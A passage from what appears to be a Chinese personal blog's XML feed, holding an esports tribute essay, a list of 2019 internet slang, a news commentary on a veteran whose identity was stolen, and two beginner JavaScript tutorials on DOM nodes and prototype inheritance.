data-src="https://pic4.zhimg.com/50/v2-4972e9b99928aa97330d1fc3153749e6_hd.gif">&emsp;&emsp;Faker直言希望明凯作为打野组队意识流打野，英雄池深到可以称为打野百科全书。别出一格的符文搭配与刷野路线让他在新赛季高分rank局里成为最速升级打野，并且广被模仿。他毫无疑问是LPL的图腾选手，毫无疑问地站在世界巅峰过。毁誉参半，至今也有不少人对他厌恶到极点。EDG承载过太多人的青春和希望，也一次次让人失望。水友赛里有个水友说，“我想看诺言再拿个冠军。”诺言原本打出的是“会”，删掉改成了“行”，最终打出来的却是“谢谢”。<img data-rawwidth="591" data-rawheight="255" data-size="normal" data-default-watermark-src="https://pic3.zhimg.com/50/v2-d7bd70baa312286881fd4d784be61683_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="591" data-original="https://pic1.zhimg.com/v2-fe22af4a8a541f202606e335d8800cd7_r.jpg" data-src="https://pic1.zhimg.com/50/v2-fe22af4a8a541f202606e335d8800cd7_hd.jpg"><img data-rawwidth="593" data-rawheight="229" data-size="normal" data-default-watermark-src="https://pic3.zhimg.com/50/v2-9e55ca7cf687d36e8c10e17f2822e524_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="593" data-original="https://pic1.zhimg.com/v2-b076c5b75bf8ed1e4f31c79ca1a5375a_r.jpg" data-src="https://pic1.zhimg.com/50/v2-b076c5b75bf8ed1e4f31c79ca1a5375a_hd.jpg">&emsp;&emsp;去年S赛小IG拿了LPL第一个全球总决赛冠军，七年磨一剑，无数玩家喜极而泣。明凯发微博，“舞台下，也许更能看清前方的道路。”曾经的口嗨让梦想打野退役，差点如愿以偿，我却开始希望他不要走。尽吾志也而不能至者，可以无悔矣，其孰能讥之乎？他真的在意的是钱吗，众所周知，以诺言的人气和影响力，退役直播大概率并不会低于他的现在收入。<img data-rawwidth="1080" data-rawheight="2090" data-size="normal" data-default-watermark-src="https://pic4.zhimg.com/50/v2-c52402e6cb29d9dff3c3c25e8af4f136_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="1080" data-original="https://pic3.zhimg.com/v2-33021b502869b562d9abadf8fd1296a4_r.jpg" data-src="https://pic3.zhimg.com/50/v2-33021b502869b562d9abadf8fd1296a4_hd.jpg">&emsp;&emsp;诺言已经一年没上过场了，这个曾经站在世界之巅的男人，爱他的恨他的都拿着放大镜看他。最终对他也越来越宽容了。微博年度超话明凯排名第六，超过李现和迪丽热巴。在他之前的两名选手，一位是LPL台柱子UZI，一位是现象级选手TheShy。可遗憾无法被怜悯和施舍弥补，曾经的英雄一次次带着血和灰爬起来，却最终不得不妥协，那么多年盼望的神之位的奖杯，是属于年轻人的。S7EDG输了，无数粉丝在现场泣不成声。24岁的明凯坐在那里，看着EDG的光芒逐渐暗淡，满眼都是金色的雨。<img data-rawwidth="587" data-rawheight="391" data-size="normal" data-default-watermark-src="https://pic2.zhimg.com/50/v2-16df45cb9a344f3de2661673e94c54aa_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="587" data-original="https://pic2.zhimg.com/v2-2d7e53d585c720f0bbac800fe7f2093d_r.jpg" data-src="https://pic2.zhimg.com/50/v2-2d7e53d585c720f0bbac800fe7f2093d_hd.jpg">&emsp;&emsp;我看到一位女粉丝，她声嘶力竭地在现场喊——“明凯，你别在意”时至今日，我也想再一次为赛场上的明凯喊出这句话。“守护全世界最好的诺言”，守护的是那段在屏幕前赛场下，屏息凝视，欢呼雀跃，沉默不语的青春岁月。江湖终不似我来时。FPX.tian，因为看了明凯msi夺冠后投入电竞事业，明凯是天的职业偶像。一个最早的世界赛双冠打野，感召粉丝进入职业，进入lpl并为lpl拿下第二个冠军，巩固第一赛区的地位，而这位粉丝也是S赛的fmvp。薪火相传，天下没有不散的筵席。每位选手都会迎来退役的那天，每位职业都有生涯的昨天与今天，只是可能不再有明天，但是LPL，一直有明天。德杯将会是明凯的第一次BP，S10世界赛在中国举办，明凯将以新的身份带领队员。传奇永不灭，又将有无数的新星挑战神位，也可能会有新王崛起，这就是我们所热爱的LOL，残酷而热烈。少年啊少年，你又将为谁而哭泣呢？尽管结果不尽人意，却依然拼尽了全力。不要在意，继续走下去，陪这个游戏，这个赛场，走到你们力所能及的地方吧。<img data-rawwidth="1080" data-rawheight="1620" data-size="normal" data-default-watermark-src="https://pic3.zhimg.com/50/v2-e88e40062386c12867a1404ab4d0604d_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="1080" data-original="https://pic1.zhimg.com/v2-1d9a4f25050b9f2b4e982c2c659ad652_r.jpg" data-src="https://pic1.zhimg.com/50/v2-1d9a4f25050b9f2b4e982c2c659ad652_hd.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 吹牛逼 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LOL </tag>
            
            <tag> 英雄联盟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年十大网络用语发布</title>
      <link href="net-word.html"/>
      <url>net-word.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><img alt="社会" class="thumb lazyload" data-src="https://www.williamlong.info/logo/Society.gif"><p>　　12月2日，据教育部官网显示，国家语言资源监测与研究中心发布了“2019年度十大网络用语”。本次发布的十个网络用语依次为：不忘初心；道路千万条，安全第一条；柠檬精；好嗨哟；是个狼人；雨女无瓜；硬核；996；14亿护旗手；断舍离。</p><p>　　据悉，“2019年十大网络用语”是基于国家语言资源监测语料库（网络媒体部分），采用“以智能信息处理技术为主，以人工后期微调为辅”的方式提取获得的。监测语料库包含了代表性网络论坛、网络新闻、博客等不同媒体形式的海量年度语言资源，用数据反映了年度流行网络用语的使用情况。其中，本次发布所涉及的网络论坛部分的数据就包含了超过40万个帖子，字符数超过5亿。</p><p>　　“2019年十大网络用语”解读</p><p>　　一、不忘初心</p><p>　　意思是不忘记最初的心愿。习近平总书记在党的十九大报告中庄严宣告：“中国共产党人的初心和使命，就是为中国人民谋幸福，为中华民族谋复兴。”其实，每个人都有一颗初心的种子，都应当寻找初心、牢记初心、保持初心，为实现自己的小目标努力奋斗，为实现中国梦添砖加瓦。</p><p>　　二、道路千万条，安全第一条</p><p>　　此语的流行源于电影《流浪地球》中反复使用的一句台词，后被多地交警作为交通安全宣传用语采用。网友仿照该句式创造出多种“××千万条，××第一条”的用法，使这一网络用语得到了更广泛的使用和传播。</p><p>　　三、柠檬精</p><p>　　字面意思是柠檬成精，指很喜欢酸别人，嫉妒别人。现多用于自嘲式地表达对他人从外貌到内在、从物质生活到情感生活的多重羡慕。</p><p>　　四、好嗨哟</p><p>　　来源于同名网络歌曲，经过短视频达人改编并配合十分魔性的表演，引得许多人模仿，用于表达很高兴和兴奋的状态。</p><p>　　五、是个狼人</p><p>　　由“是个狠人”演变而来的，意思是“比狠人再狠‘一点’”。通常用来调侃某人做事不按常理出牌，却又能取得奇效，给人一种出乎意外的很厉害的感觉。</p><p>　　六、雨女无瓜</p><p>　　“与你无关”的谐音，是一种普通话不标准、带有方言腔的表达。这种表达看起来高冷神秘，有点让人摸不着头脑，再加上表情包显得十分逗趣，通常用于回怼或调侃别人。</p><p>　　七、硬核</p><p>　　该词最早指说唱音乐的一种形式，被认为更具有力量感。后引申为“核心部分、中坚分子”，有厉害、霸气之义。如硬核技术指很关键、很核心的技术；说某人很硬核可以指对方很强硬、很彪悍。</p><p>　　八、996</p><p>　　指工作时间从早上9点到晚上9点，一周工作6天，代表着中国互联网企业盛行的加班文化。但崇尚奋斗、崇尚劳动不等于强制加班。苦干是奋斗，巧干也是奋斗；延长工时是奋斗，提高效率也是奋斗。</p><p>　　九、14亿护旗手</p><p>　　面对有暴徒在香港把国旗丢进海中的暴行，央视新闻当天发布微博话题“五星红旗有14亿护旗手”并置顶，网友们纷纷留言、刷屏转发，表达热爱祖国、护卫国旗的真挚感情。</p><p>　　十、断舍离</p><p>　　一种生活态度，意思是把那些不必需、不合适、过时的东西统统断绝、舍弃，并切断对它们的眷恋，“断舍离”之后才能过简单清爽的生活。</p><p>2019年十大网络用语发布<br><img alt="2019年十大网络用语发布" data-src="https://www.williamlong.info/logo/Society.jpg" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> 吹牛逼 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> news </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>退伍军人被顶替</title>
      <link href="%E9%80%80%E4%BC%8D%E5%86%9B%E4%BA%BA%E8%A2%AB%E9%A1%B6%E6%9B%BF.html"/>
      <url>%E9%80%80%E4%BC%8D%E5%86%9B%E4%BA%BA%E8%A2%AB%E9%A1%B6%E6%9B%BF.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="退伍军人被顶替23年：地方能人一手操办之风可休矣"><a href="#退伍军人被顶替23年：地方能人一手操办之风可休矣" class="headerlink" title="退伍军人被顶替23年：地方能人一手操办之风可休矣"></a>退伍军人被顶替23年：地方能人一手操办之风可休矣</h1><div id="left-container" class="left-container"><div class="item-wrap"><div class="article " id="article" data-islow-browser="0"><div class="article-content"><div class="img-container"><img class="large lazyload" data-loadfunc="0" data-loaded="0" data-src="http://pics2.baidu.com/feed/1c950a7b02087bf4bdad20e2bd968c2910dfcfc7.png?token=b5d6c83e879ea258426889a2554900af&amp;s=B3B178855E6600091080B90A0300A091"></div><p><span class="bjh-p">资料图 来源：新京报我们视频</span></p><p><span class="bjh-p">李逵再遇李鬼，只不过这次不是冒名顶替上大学。日前，河南周口47岁的退伍军人仵瑞华无意中发现自己在23年前就被人冒名以退伍军人身份享受安置待遇，冒名者现为当地某镇政府工作人员，每月工资3489元。截至目前，当地已就此事成立专项调查组介入，同时表态称“无论牵涉到谁，都将严肃处理，绝不姑息”，涉事人员亦被警方控制并接受问询。</span></p><p><span class="bjh-p">现正经营一家小装修公司的被顶替者仵瑞华，过去一个多月时间都沉浸和奔波于这桩被冒名顶替的申诉中，其现在的收入与冒名者的收入比，可能并不低，甚至外界会对此有所谓“值不值”的评价和议论。但对当事者而言，这从一开始就不是(或者说不仅是)一个23年经济收入损失的问题，而事关一个人的工作机会、职业规划和抱负(因为被冒名顶替的事，勾起了当事人对年少时志向的想法)，于个人而言涉及到最基本的公平和权利，以政府人事管理而论，更攸关人事管理流程与制度的严肃性，以及基层权力涉嫌的寻租与渎职。</span></p><p><span class="bjh-p">一桩退伍军人被冒名事件，因一次信息的主动公开而发端，更因相关情况被公之于众而成为舆论热议焦点，由此也可看到<span class="bjh-strong">公开对于权力监督的价值和意义。</span>正是当事人在散步中无意发现的一份“退伍军人安置名单”，牵出了23年前的冒名顶替上班旧事，也是因为信息公开后的被聚焦和广泛传播，才推动了个案内情的被调查，而不是循着当地一开始所谓“不闹僵”的劝解思路进行。<span class="bjh-strong">公开之于监督的意义不可低估，哪怕只是一份年代久远的普通名单或者账目，都可能为公众勾勒一幅彼时基层权力运行的真实图景。</span></span></p><p><span class="bjh-p">1996年的冒名顶替案，现在看来确实属于陈年旧账，甚至以现在的眼光、性价比去判断，对很多人来说可能都早已“不值一提”。但回到事发当时的基层权力运行真实状态，一位退伍军人被冒名安置或者一个高考学生被顶替上大学，<span class="bjh-strong">类似的权力寻租和操作难度在当地的现实政治环境中，都可能注定会是考验某个“能人”或者某个“能量”家族综合实力的关键时刻。</span>一次现在看来常规化的普通信息公开操作，当事人的姓名、服役信息乃至全套档案资料被发现和冒用，需要打通的关节自不会少，参与或者起码默许此类违规操作的公职人员是否会受到彻查和追究，公众与当事人一样拭目以待。</span></p><p><span class="bjh-p">好在时过境迁，彼时有能量在当地呼风唤雨的责任人，现在可能多已失去干扰和妨碍调查的能力，这对彻查陈年旧案来说堪称利好。但在事件未进入舆论前的当地反应，对被冒名者想深究的举动不乏泼冷水者，很难去判断这是基于对陈年旧案复杂情况的逃避，还是对到目前为止仍隐于幕后的“能人”的袒护。<span class="bjh-strong">无论如何这都不是政务服务该有的态度和做派，只会让权利被侵害者更加寒心，也让违规者继续坐享彼时侵夺而来的利益，得不到应有的问责和惩罚。</span>既然当地有关部门已有“顶替者亲属一手操办”的认定，那么对于“一手操办”有关的诸多环节、一应责任人，都应当有彻底的调查和梳理。</span></p><p><span class="bjh-p"><span class="bjh-strong">人事管理的陈年旧账不能一直被容忍而不清理和清查，此番靠信息公开意外“收获”的权力违规滥用的线索有必要被深究。</span>不光是要给合法权益和机会被侵夺23年的当事人一个最基本的交待，更要以此为契机，对正在逐步完善的基层人事管理制度做对照性筛查。</span></p><p><span class="bjh-p">冒名顶替的陈年旧事，要给即便在当下也时不时会发生的地方机关事业单位“萝卜招考招聘”再敲一次警钟：<span class="bjh-strong">伸手必被捉，可能只是时间早晚问题。</span><span class="bjh-strong">时代在发展，制度和技术终将趋于严密，社会对基层权力寻租的容忍度也随之不断降低。</span>特别是随着信息公开范围与实践的扩大，彼时的权力违规操作，哪怕当时多么天衣无缝，都难免在不经意中被扯出来，甚至“拔出萝卜带出泥”，<span class="bjh-strong">这是权力现代化转型的一个副产品，给社会公共治理不断带来小惊喜。</span></span></p><p><span class="bjh-br"></span>(来源:南方都市报)</p></div><audio height="0" width="0" id="musicAudio" data-play-index><source></audio></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 新闻 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> news </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原生js节点操作</title>
      <link href="%E5%8E%9F%E7%94%9Fjs%E8%8A%82%E7%82%B9%E6%93%8D%E4%BD%9C.html"/>
      <url>%E5%8E%9F%E7%94%9Fjs%E8%8A%82%E7%82%B9%E6%93%8D%E4%BD%9C.html</url>
      
        <content type="html"><![CDATA[<h1 id="原生js节点操作"><a href="#原生js节点操作" class="headerlink" title="原生js节点操作"></a>原生js节点操作</h1><h2 id="节点属性值"><a href="#节点属性值" class="headerlink" title="节点属性值"></a>节点属性值</h2><p>1 获取上级节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Node.parentNode     &#x2F;&#x2F;返回父节点</span><br><span class="line">Node.ownerDocument  &#x2F;&#x2F;返回祖先节点</span><br></pre></td></tr></table></figure><p>2 获取下级节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Node.childNodes     &#x2F;&#x2F;返回相邻后代的元素节点和文本节点对象的集合(换行算作文本节点)</span><br><span class="line">Node.children       &#x2F;&#x2F;返回相邻后代的元素节点集合</span><br><span class="line">Node.firstChild     &#x2F;&#x2F;返回相邻后代第一个的元素节点</span><br><span class="line">Node.lastChild      &#x2F;&#x2F;返回相邻后代最后一个的元素节点</span><br></pre></td></tr></table></figure><p>3 获取同级节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Node.previousSibling   &#x2F;&#x2F; 返回前一个节点</span><br><span class="line">Node.nextSibling       &#x2F;&#x2F; 返回后一个节点</span><br></pre></td></tr></table></figure><h2 id="节点方法"><a href="#节点方法" class="headerlink" title="节点方法"></a>节点方法</h2><p>1 创建</p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.createElement(&#39;li&#39;)           &#x2F;&#x2F;创建元素节点</span><br><span class="line">document.createAttribute(&quot;class&quot;)      &#x2F;&#x2F;创建属性节点</span><br><span class="line">document.createTextNode(&quot;Hello World&quot;) &#x2F;&#x2F;创建文本节点</span><br></pre></td></tr></table></figure><p>2 复制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var newNode&#x3D;Node.cloneNode(Boolean)    </span><br><span class="line">&#x2F;&#x2F;Boolean:true  返回Node及其全部子孙节点</span><br><span class="line">&#x2F;&#x2F;Boolean:false 只返回Node节点</span><br></pre></td></tr></table></figure><p>3 增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parentNode.appendChild(newNode)     &#x2F;&#x2F;增加节点至子节点末尾</span><br><span class="line">parentNode.insertBefore(newNode,targetNode)   &#x2F;&#x2F;增加节点至targetNode之前</span><br><span class="line">parentNode.innerHTML+&#x3D;&#39;&lt;li&gt;&lt;&#x2F;li&gt;&#39;   &#x2F;&#x2F;增加元素节点至子节点末尾</span><br><span class="line">parentNode.innerText+&#x3D;&#39;Hello World&#39; &#x2F;&#x2F;增加文本节点至子节点末尾</span><br></pre></td></tr></table></figure><p>4 删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parentNode.removeChild(childNode)     &#x2F;&#x2F;已知父节点</span><br><span class="line">node.parentNode.removeChild(childNod) &#x2F;&#x2F;未知父节点</span><br></pre></td></tr></table></figure><p>5 获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById()</span><br><span class="line">document.getElementsByClassName()</span><br><span class="line">document.getElementsByTagName()  </span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript Object.create()函数</title>
      <link href="javascript-Object-create-%E5%87%BD%E6%95%B0.html"/>
      <url>javascript-Object-create-%E5%87%BD%E6%95%B0.html</url>
      
        <content type="html"><![CDATA[<h1 id="javascript-Object-create-函数"><a href="#javascript-Object-create-函数" class="headerlink" title="javascript Object.create()函数"></a>javascript Object.create()函数</h1><p>Object.create() 方法会使用指定的原型对象及其属性去创建一个新的对象。 <br><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.create(proto, [ propertiesObject ])</span><br></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proto</span><br><span class="line">一个对象，应该是新创建的对象的原型。</span><br><span class="line">propertiesObject</span><br><span class="line">可选。该参数对象是一组属性与值，该对象的属性名称将是新创建的对象的属性名称，值是属性描述符</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="测试-lt"><a href="#测试-lt" class="headerlink" title="测试&lt;"></a>测试&lt;</h2><p>1参数proto为原型对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;实现继承</span><br><span class="line">function Father()&#123;&#125;</span><br><span class="line">function Child()&#123;&#125;</span><br><span class="line">Child.prototype&#x3D;Object.create(Father.prototype);</span><br><span class="line">console.log(Child.prototype.__proto__&#x3D;&#x3D;&#x3D;Father.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(Child.__proto__&#x3D;&#x3D;&#x3D;Father.__proto__)&#x2F;&#x2F;true</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">function A()&#123;&#125;</span><br><span class="line">var a&#x3D;Object.create(A.prototype);&#x2F;&#x2F;无prototype属性</span><br><span class="line">console.log(a.__proto__&#x3D;&#x3D;&#x3D;A.prototype)&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>2参数proto为函数对象 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function A()&#123;&#125;</span><br><span class="line">var a1&#x3D;Object.create(A)&#x2F;&#x2F;有prototype属性</span><br><span class="line">console.log(a1.prototype&#x3D;&#x3D;&#x3D;A.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(a1.__proto__&#x3D;&#x3D;&#x3D;A)&#x2F;&#x2F;true</span><br><span class="line">&#x2F;&#x2F;对比</span><br><span class="line">var a2&#x3D;new A();&#x2F;&#x2F;无prototype属性</span><br><span class="line">console.log(a2.__proto__&#x3D;&#x3D;&#x3D;A.prototype)&#x2F;&#x2F;true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3参数proto为函数实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function A()&#123;&#125;</span><br><span class="line">var A1&#x3D;new A();</span><br><span class="line">var a&#x3D;Object.create(A1);&#x2F;&#x2F;无prototype属性</span><br><span class="line">console.log(a.__proto__&#x3D;&#x3D;&#x3D;A1)&#x2F;&#x2F;true</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js 原型继承分析</title>
      <link href="js-%E5%8E%9F%E5%9E%8B%E7%BB%A7%E6%89%BF%E5%88%86%E6%9E%90.html"/>
      <url>js-%E5%8E%9F%E5%9E%8B%E7%BB%A7%E6%89%BF%E5%88%86%E6%9E%90.html</url>
      
        <content type="html"><![CDATA[<h1 id="js-原型继承分析"><a href="#js-原型继承分析" class="headerlink" title="js 原型继承分析"></a>js 原型继承分析</h1><h2 id="1、继承上下文"><a href="#1、继承上下文" class="headerlink" title="1、继承上下文"></a>1、继承上下文</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;人</span><br><span class="line">function Person(lastname,firstname,gender)&#123;</span><br><span class="line">    this.lastname&#x3D;lastname;</span><br><span class="line">    this.firstname&#x3D;firstname;</span><br><span class="line">    this.gender&#x3D;gender;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;作家</span><br><span class="line">function Writer(lastname,firstname,gender,worksname)&#123;</span><br><span class="line">    this.worksname&#x3D;worksname;</span><br><span class="line">    Person.apply(this,arguments);&#x2F;&#x2F;继承人类的上下文</span><br><span class="line">    &#x2F;&#x2F;Person.apply(this,lastname,firstname,gender);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;给作家添加原型方法</span><br><span class="line">Writer.prototype.introduce&#x3D;function()&#123;</span><br><span class="line">    console.log(&#39;我叫 %s %s \n性别 %s \n我的成名作是 %s&#39;,this.lastname,this.firstname,this.gender,this.worksname);</span><br><span class="line">    &#125;</span><br><span class="line">&#x2F;&#x2F;实例化作家苏洵</span><br><span class="line">var writer&#x3D;new Writer(&#39;苏&#39;,&#39;洵&#39;,&#39;mela&#39;,&#39;六国论&#39;);</span><br><span class="line">writer.introduce();</span><br><span class="line">&#x2F;*我叫 苏 洵 </span><br><span class="line">  性别 mela </span><br><span class="line">  我的成名作是 六国论*&#x2F;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2、继承原型"><a href="#2、继承原型" class="headerlink" title="2、继承原型"></a>2、继承原型</h2><p>关于原型、原型链不了解可以戳这  <a href="https://nikoyu.asia/JS-原型、原型链、构造器关系.html" rel="nofollow" target="_blank"><strong>js 原型、原型链、构造器关系</strong></a></p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;人</span><br><span class="line">function Person(lastname,firstname,gender)&#123;</span><br><span class="line">    this.lastname&#x3D;lastname;</span><br><span class="line">    this.firstname&#x3D;firstname;</span><br><span class="line">    this.gender&#x3D;gender;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype&#x3D;&#123;</span><br><span class="line">    constructor:Person,</span><br><span class="line">    eat()&#123;</span><br><span class="line">        console.log(&#39;我饿了需要吃饭&#39;);</span><br><span class="line">    &#125;,</span><br><span class="line">    breathe()&#123;</span><br><span class="line">        console.log(&#39;我不呼吸会死的&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;作家</span><br><span class="line">function Writer(lastname,firstname,gender,worksname)&#123;</span><br><span class="line">    this.worksname&#x3D;worksname;</span><br><span class="line">    Person.apply(this,arguments);&#x2F;&#x2F;继承人类的上下文</span><br><span class="line">    &#x2F;&#x2F;Person.apply(this,lastname,firstname,gender);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;原型继承</span><br><span class="line">Writer.prototype&#x3D;new Person();</span><br><span class="line">&#x2F;&#x2F;或者Writer.prototype&#x3D;Object.create(Person.prototype);</span><br><span class="line">Writer.prototype.constructor&#x3D;Writer;</span><br><span class="line">Writer.prototype.introduce&#x3D;function()&#123;</span><br><span class="line">    console.log(&#39;我叫 %s %s \n性别 %s \n我的成名作是 %s&#39;,this.lastname,this.firstname,this.gender,this.worksname);</span><br><span class="line">    &#125;</span><br><span class="line">Writer.prototype.init&#x3D;&#39;老子可是笔下生花的作家呀&#39;;</span><br><span class="line">var writer&#x3D;new Writer(&#39;苏&#39;,&#39;洵&#39;,&#39;mela&#39;,&#39;六国论&#39;);</span><br><span class="line">writer.eat()&#x2F;&#x2F;我饿了需要吃饭</span><br><span class="line">writer.breathe()&#x2F;&#x2F;我不呼吸会死的</span><br><span class="line">writer.introduce()&#x2F;*我叫 苏 洵 </span><br><span class="line">                    性别 mela </span><br><span class="line">                   我的成名作是 六国论*&#x2F;</span><br><span class="line">console.log(writer.init)&#x2F;&#x2F;&quot;老子可是笔下生花的作家呀&quot;</span><br></pre></td></tr></table></figure><p>分析：<strong><code>Writer.prototype=new Person()</code></strong></p><p>这句代码让Write的原型成为Person的一个实例，而new Person()的原型链(__proto__)指向Person的原型(prototype)，所以有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Writer.prototype.__proto__&#x3D;&#x3D;&#x3D;Person.prototype&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>再看看此时Writer的原型</p><p><img alt="这里写图片描述" title data-src="https://img-blog.csdn.net/20170804133139604?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2VpeGluXzM4MjgzMTU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></p><p>返回的是Person对象，但是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Writer.prototype&#x3D;&#x3D;&#x3D;Person&#x2F;&#x2F;false  new Person()当然不等于Person</span><br></pre></td></tr></table></figure><p><strong>自我理解是Writer继承new Person()提供的Person方法和属性后就与Person脱离关系</strong> <br>这也是为啥不直接用<code>Writer.prototype=Person.prototype</code> <br>到此Writer的实例就可以使用Person的原型方法了</p><p>分析：<strong><code>Writer.prototype=Object.create(Person.prototype);</code></strong></p><p>Object.create(proto, [ propertiesObject ])函数创建一个指定原型且可选择性地包含指定属性的对象 <br>可以先肤浅的认为和<strong><code>Writer.prototype=new Person()</code></strong>效果一样 <br>分析：<strong><code>Writer.prototype.constructor=Writer;</code></strong></p><p>如果缺少这句就有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Writer&#x3D;&#x3D;&#x3D;writer.constructor&#x2F;&#x2F;false</span><br><span 